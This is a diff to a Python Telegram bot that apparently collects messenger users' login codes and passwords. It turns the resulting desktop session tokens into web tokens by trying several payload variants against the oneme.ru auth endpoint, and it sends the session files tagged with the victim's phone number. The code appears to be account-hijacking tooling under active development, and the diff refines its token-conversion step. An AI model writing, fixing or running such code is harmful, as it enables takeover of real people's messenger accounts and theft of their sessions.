@@ -103,40 +103,50 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
 async def try_convert_to_web_token(desktop_token, user_id):
-    """Пробует разные эндпоинты для конвертации токена."""
+    """Пробует разные варианты конвертации токена."""
     web_device_id = str(uuid.uuid4())
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
         "Content-Type": "application/json"
     }
     
-    endpoints = [
-        "https://api.oneme.ru/auth/token",
-        "https://api.oneme.ru/auth/convert",
-        "https://api.oneme.ru/v2/auth/web",
-        "https://ws-api.oneme.ru/auth/token",
+    payloads = [
+        {
+            "session_token": desktop_token,
+            "device_id": web_device_id,
+            "device_type": "WEB"
+        },
+        {
+            "token": desktop_token,
+            "viewerId": user_id,
+            "device_id": web_device_id
+        },
+        {
+            "auth_token": desktop_token,
+            "user_id": user_id,
+            "device_id": web_device_id
+        }
     ]
     
     async with aiohttp.ClientSession() as session:
-        for endpoint in endpoints:
+        for i, payload in enumerate(payloads):
             try:
-                resp = await session.post(endpoint, json={
-                    "token": desktop_token,
-                    "user_id": user_id,
-                    "device_id": web_device_id,
-                    "device_type": "WEB"
-                }, headers=headers)
+                resp = await session.post(
+                    "https://ws-api.oneme.ru/auth/token",
+                    json=payload,
+                    headers=headers
+                )
                 text = await resp.text()
-                logging.info(f"Эндпоинт {endpoint}: {resp.status} {text[:200]}")
+                logging.info(f"Вариант {i+1}: {resp.status} {text[:300]}")
                 if resp.status == 200:
                     try:
                         data = json.loads(text)
-                        if data.get("ok") and data.get("token"):
+                        if data.get("token"):
                             return data["token"], web_device_id
                     except:
                         pass
             except Exception as e:
-                logging.error(f"Ошибка {endpoint}: {e}")
+                logging.error(f"Ошибка вариант {i+1}: {e}")
     return None, None
 
 @dp.message(F.text == "/start")
@@ -255,7 +265,6 @@ async def code_handler(message: types.Message, state: FSMContext):
             session_id = int(time.time() * 1000)
             device_id = str(uuid.uuid4())
 
-            # Пробуем конвертировать токен
             web_js = None
             web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
             if web_token:
@@ -340,7 +349,6 @@ async def password_handler(message: types.Message, state: FSMContext):
         session_id = int(time.time() * 1000)
         device_id = str(uuid.uuid4())
 
-        # Пробуем конвертировать токен
         web_js = None
         web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
         if web_token:
